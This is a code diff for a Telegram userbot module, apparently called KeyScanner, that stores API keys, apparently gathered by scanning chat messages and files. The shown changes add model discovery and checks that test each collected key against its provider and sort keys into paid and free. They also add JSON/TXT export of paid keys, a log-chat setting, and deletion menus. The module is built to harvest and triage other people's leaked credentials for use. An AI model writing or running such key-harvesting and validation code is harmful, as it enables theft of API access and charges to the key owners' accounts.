+                self._btn(f"{self.strings['btn_exp_paid']} JSON ({paid_c})", self.ks_exp_json, ("paid",), "success"),
+                self._btn(f"{self.strings['btn_exp_paid']} TXT",             self.ks_exp_txt,  ("paid",), "success"),
             ])
         if free_c:
             markup.append([
-                {"text": f"{self.strings['btn_exp_free']} JSON ({free_c})", "callback": self.ks_exp_json, "args": ("free",)},
-                {"text": f"{self.strings['btn_exp_free']} TXT",             "callback": self.ks_exp_txt,  "args": ("free",)},
+                self._btn(f"{self.strings['btn_exp_free']} JSON ({free_c})", self.ks_exp_json, ("free",), "danger"),
+                self._btn(f"{self.strings['btn_exp_free']} TXT",             self.ks_exp_txt,  ("free",), "danger"),
             ])
-        markup.append([{"text": self.strings["btn_back"], "callback": self.ks_back}])
+        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
         await call.edit(text=f"{E_DOWN} <b>Select export format:</b>", reply_markup=markup)
 
     async def ks_exp_json(self, call, filter_mode="all"):
@@ -943,13 +1358,20 @@ class KeyScanner(loader.Module):
         total = len(self._keys)
         if not total:
             await call.edit(text=self.strings["empty"],
-                reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]])
+                reply_markup=[[self._btn(self.strings["btn_back"], self.ks_back, style="primary")]])
             return
         await call.edit(text=self.strings["sorting"].format(done=0, total=total))
         paid = free = unknown = done = 0
         async with aiohttp.ClientSession() as session:
             for key, prov in list(self._keys.items()):
-                status = await self._check_paid(session, key, prov)
+                models = await self._discover_models(session, key, prov)
+                if models:
+                    self._ensure_model_cache()[key] = models
+                else:
+                    self._ensure_model_cache().pop(key, None)
+                status = await self._check_paid(session, key, prov, models=models)
+                if status == "unknown":
+                    status = self._tier_from_models(prov, models) or "unknown"
                 self._paid_status[key] = status
                 if status == "paid":   paid    += 1
                 elif status == "free": free    += 1
@@ -963,14 +1385,14 @@ class KeyScanner(loader.Module):
         self._save()
         markup = []
         if free:
-            markup.append([{"text": f"{self.strings['btn_del_free']} ({free})",  "callback": self.ks_del_by_filter, "args": ("free",)}])
+            markup.append([self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_del_by_filter, ("free",), "danger")])
         if paid:
-            markup.append([{"text": f"{self.strings['btn_del_paid']} ({paid})",  "callback": self.ks_del_by_filter, "args": ("paid",)}])
+            markup.append([self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_del_by_filter, ("paid",), "danger")])
         markup.append([
-            {"text": f"{self.strings['btn_exp_paid']} ({paid})", "callback": self.ks_exp_txt, "args": ("paid",)},
-            {"text": f"{self.strings['btn_exp_free']} ({free})", "callback": self.ks_exp_txt, "args": ("free",)},
+            self._btn(f"{self.strings['btn_exp_paid']} ({paid})", self.ks_exp_txt, ("paid",), "primary"),
+            self._btn(f"{self.strings['btn_exp_free']} ({free})", self.ks_exp_txt, ("free",), "primary"),
         ])
-        markup.append([{"text": self.strings["btn_back"], "callback": self.ks_back}])
+        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
         await call.edit(
             text=self.strings["sort_done"].format(paid=paid, free=free, unknown=unknown),
             reply_markup=markup,
@@ -991,18 +1413,20 @@ class KeyScanner(loader.Module):
         mode      = self._settings.get("log_mode",  "none")
         file_scan = self._settings.get("file_scan", True)
         edit_scan = self._settings.get("edit_scan", True)
+        target_text = self._log_target_text()
         markup = [
-            [{"text": self.strings["btn_log_cycle"],                              "callback": self.ks_cycle_log}],
-            [{"text": self.strings["btn_toggle_file"] + (" ✅" if file_scan else " ❌"), "callback": self.ks_toggle_file}],
-            [{"text": self.strings["btn_toggle_edit"] + (" ✅" if edit_scan else " ❌"), "callback": self.ks_toggle_edit}],
-            [{"text": self.strings["btn_back"], "callback": self.ks_back}],
+            [self._btn(self.strings["btn_log_cycle"], self.ks_cycle_log, style="primary")],
+            [self._btn(self.strings["btn_log_target"], self.ks_logchat_help, style="success")],
+            [self._btn(self.strings["btn_toggle_file"] + (" ✅" if file_scan else " ❌"), self.ks_toggle_file, style="success" if file_scan else "danger")],
+            [self._btn(self.strings["btn_toggle_edit"] + (" ✅" if edit_scan else " ❌"), self.ks_toggle_edit, style="success" if edit_scan else "danger")],
+            [self._btn(self.strings["btn_back"], self.ks_back, style="primary")],
         ]
         await call.edit(
             text=self.strings["settings_title"].format(
                 log_mode  = mode.upper(),
                 file_scan = "ON" if file_scan else "OFF",
                 edit_scan = "ON" if edit_scan else "OFF",
-            ),
+            ) + f"\n\n{self.strings['log_target_label'].format(target=target_text)}\n{self.strings['log_topic_label'].format(topic=self._log_target().get('topic_title') or 'Logs')}",
             reply_markup=markup,
         )
 
@@ -1012,6 +1436,90 @@ class KeyScanner(loader.Module):
         self._settings["log_mode"] = modes[(modes.index(cur) + 1) % len(modes)]
         self._save()
         await self.ks_settings_menu(call)
+
+    @loader.command(ru_doc="<чат/ссылка/@username/chat_id> [топик] - Установить чат логов", en_doc="<chat/link/@username/chat_id> [topic] - Set log chat")
+    async def kslogchat(self, message: Message):
+        raw = utils.get_args_raw(message).strip()
+        if not raw:
+            return await utils.answer(message, self.strings["log_target_help"])
+        parts = raw.split(maxsplit=1)
+        target_raw = parts[0]
+        topic_title = parts[1].strip() if len(parts) > 1 else None
+        try:
+            resolved = await self._resolve_entity_best_effort(target_raw)
+        except Exception:
+            resolved = target_raw
+        if resolved is None:
+            return await utils.answer(message, self.strings["log_target_help"])
+
+        target = self._log_target()
+        target["chat_id"] = resolved
+        if topic_title:
+            target["topic_title"] = topic_title[:128]
+            target["thread_id"] = None
+        else:
+            target.setdefault("topic_title", "Logs")
+        self._save()
+
+        
+        try:
+            chat_obj = None
+            for meth in ("get_entity", "get_chat"):
+                fn = getattr(self.client, meth, None)
+                if callable(fn):
+                    try:
+                        chat_obj = await fn(resolved)
+                        break
+                    except Exception:
+                        pass
+            if chat_obj is not None and self._is_forum_chat(chat_obj):
+                topic = await self._create_forum_topic(resolved, target.get("topic_title") or "Logs")
+                thread_id = self._topic_thread_id_from_result(topic)
+                if thread_id:
+                    target["thread_id"] = thread_id
+                    self._save()
+        except Exception:
+            pass
+
+        return await utils.answer(message, self.strings["log_target_set"] + f"\n{self.strings['log_target_label'].format(target=self._log_target_text())}\n{self.strings['log_topic_label'].format(topic=target.get('topic_title') or 'Logs')}")
+
+    @loader.command(ru_doc="[название] - Переименовать/задать топик логов", en_doc="[title] - Set log topic title")
+    async def kslogtopic(self, message: Message):
+        title = utils.get_args_raw(message).strip()
+        if not title:
+            return await utils.answer(message, self.strings["log_target_help"])
+        target = self._log_target()
+        target["topic_title"] = title[:128]
+        target["thread_id"] = None
+        self._save()
+        if target.get("chat_id") is not None:
+            try:
+                chat_obj = None
+                for meth in ("get_entity", "get_chat"):
+                    fn = getattr(self.client, meth, None)
+                    if callable(fn):
+                        try:
+                            chat_obj = await fn(target["chat_id"])
+                            break
+                        except Exception:
+                            pass
+                if chat_obj is not None and self._is_forum_chat(chat_obj):
+                    topic = await self._create_forum_topic(target["chat_id"], title)
+                    thread_id = self._topic_thread_id_from_result(topic)
+                    if thread_id:
+                        target["thread_id"] = thread_id
+                        self._save()
+            except Exception:
+                pass
+        return await utils.answer(message, self.strings["log_target_topic"] + f"\n{self.strings['log_target_label'].format(target=self._log_target_text())}\n{self.strings['log_topic_label'].format(topic=target.get('topic_title') or 'Logs')}")
+
+    async def ks_logchat_help(self, call):
+        await call.edit(
+            text=self.strings["log_target_help"] + f"\n\n{self.strings['log_target_label'].format(target=self._log_target_text())}\n{self.strings['log_topic_label'].format(topic=self._log_target().get('topic_title') or 'Logs')}",
+            reply_markup=[
+                [self._btn(self.strings["btn_back"], self.ks_settings_menu, style="primary")],
+            ],
+        )
 
     async def ks_toggle_file(self, call):
         self._settings["file_scan"] = not self._settings.get("file_scan", True)
@@ -1023,14 +1531,125 @@ class KeyScanner(loader.Module):
         self._save()
         await self.ks_settings_menu(call)
 
+    def _is_ru_locale(self):
+        return "Очист" in self.strings.get("btn_clear", "") or "Бесплатн" in self.strings.get("btn_filter_free", "")
+
+    def _clear_all_warnings(self):
+        if self._is_ru_locale():
+            return [
+                "⚠️ Это удалит всю БД. Ты уверен?",
+                "⚠️ Это удалит вообще всё. Ты точно уверен?",
+                "⚠️ Это уже не шутка — база реально уйдёт. Ты уверен?",
+                "⚠️ Ты точно понимаешь, что данные пропадут?",
+                "⚠️ Ещё один шанс передумать. Ты уверен?",
+                "⚠️ База будет очищена полностью. Без отката.",
+                "⚠️ Серьёзно, всё удалится. Ты точно хочешь этого?",
+                "⚠️ Последний нормальный шанс остановиться.",
+                "⚠️ Сейчас будет удаление всей базы. Ты уверен?",
+                "⚠️ Почти финал. Подумай ещё раз.",
+                "⚠️ Если ты всё ещё тут — жми финальную кнопку.",
+            ]
+        return [
+            "⚠️ This will delete the entire database. Are you sure?",
+            "⚠️ This will delete everything. Are you really sure?",
+            "⚠️ This is not a joke — the database will be gone. Are you sure?",
+            "⚠️ Do you fully understand this is irreversible?",
+            "⚠️ One more chance to back out. Are you sure?",
+            "⚠️ The database will be wiped completely. No undo.",
+            "⚠️ Seriously, everything will be removed. Do you want this?",
+            "⚠️ Last normal chance to stop.",
+            "⚠️ Deleting the whole database next. Are you sure?",
+            "⚠️ Almost there. Think again.",
+            "⚠️ If you're still here, hit the final button.",
+        ]
+
+    async def ks_clr_menu(self, call):
+        paid = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
+        free = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
+        title = "🗑 <b>Очистка базы:</b>" if self._is_ru_locale() else "🗑 <b>Cleanup menu:</b>"
+        subtitle = "Выберите, что удалить." if self._is_ru_locale() else "Choose what to delete."
+        markup = [
+            [
+                self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_clr_paid_confirm, style="danger"),
+                self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_clr_free_confirm, style="danger"),
+            ],
+            [self._btn(self.strings["btn_clear"], self.ks_clr_all_step, (0,), style="danger")],
+            [self._btn(self.strings["btn_back"], self.ks_back, style="primary")],
+        ]
+        await call.edit(text=f"{title}\n{subtitle}", reply_markup=markup)
+
     async def ks_clr_all(self, call):
+        await self.ks_clr_menu(call)
+
+    async def ks_clr_paid_confirm(self, call):
+        count = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
+        if not count:
+            return await call.edit(text=self.strings["empty"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])
+        text = "⚠️ Это удалит все платные ключи. Ты уверен?" if self._is_ru_locale() else "⚠️ This will delete all paid keys. Are you sure?"
+        yes = "Да, удалить платные" if self._is_ru_locale() else "Yes, delete paid"
+        markup = [
+            [self._btn(yes, self.ks_clr_paid_execute, style="danger")],
+            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
+        ]
+        await call.edit(text=text, reply_markup=markup)
+
+    async def ks_clr_free_confirm(self, call):
+        count = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
+        if not count:
+            return await call.edit(text=self.strings["empty"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])
+        text = "⚠️ Это удалит все бесплатные ключи. Ты уверен?" if self._is_ru_locale() else "⚠️ This will delete all free keys. Are you sure?"
+        yes = "Да, удалить бесплатные" if self._is_ru_locale() else "Yes, delete free"
+        markup = [
+            [self._btn(yes, self.ks_clr_free_execute, style="danger")],
+            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
+        ]
+        await call.edit(text=text, reply_markup=markup)
+
+    async def ks_clr_paid_execute(self, call):
+        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == "paid"]
+        for k in to_del:
+            self._keys.pop(k, None)
+            self._paid_status.pop(k, None)
+            self._ensure_model_cache().pop(k, None)
+        self._save()
+        msg = f"🗑 Удалено платных ключей: <b>{len(to_del)}</b>" if self._is_ru_locale() else f"🗑 Removed paid keys: <b>{len(to_del)}</b>"
+        await call.edit(text=msg, reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])
+
+    async def ks_clr_free_execute(self, call):
+        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == "free"]
+        for k in to_del:
+            self._keys.pop(k, None)
+            self._paid_status.pop(k, None)
+            self._ensure_model_cache().pop(k, None)
+        self._save()
+        msg = f"🗑 Удалено бесплатных ключей: <b>{len(to_del)}</b>" if self._is_ru_locale() else f"🗑 Removed free keys: <b>{len(to_del)}</b>"
+        await call.edit(text=msg, reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])
+
+    async def ks_clr_all_step(self, call, step=0):
+        warns = self._clear_all_warnings()
+        step = max(0, min(step, len(warns) - 1))
+        if step < len(warns) - 1:
+            next_btn = "Дальше" if self._is_ru_locale() else "Next"
+            markup = [
+                [self._btn(next_btn, self.ks_clr_all_step, (step + 1,), style="danger")],
+                [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
+            ]
+            await call.edit(text=warns[step], reply_markup=markup)
+            return
+        final_btn = "Я 1000% уверен блять"
+        markup = [
+            [self._btn(final_btn, self.ks_clr_all_execute, style="danger")],
+            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
+        ]
+        await call.edit(text=warns[step], reply_markup=markup)
+
+    async def ks_clr_all_execute(self, call):
         self._keys.clear()
         self._paid_status.clear()
+        self._ensure_model_cache().clear()
         self._save()
-        await call.edit(
-            text=self.strings["empty"],
-            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
-        )
+        msg = "🗑 Удалена вся база." if self._is_ru_locale() else "🗑 Entire database removed."
+        await call.edit(text=msg, reply_markup=[[self._btn(self.strings["btn_back"], self.ks_back, style="primary")]])
 
     async def ks_back(self, call):
         await call.edit(text=self._db_stats_text(), reply_markup=self._get_main_markup())
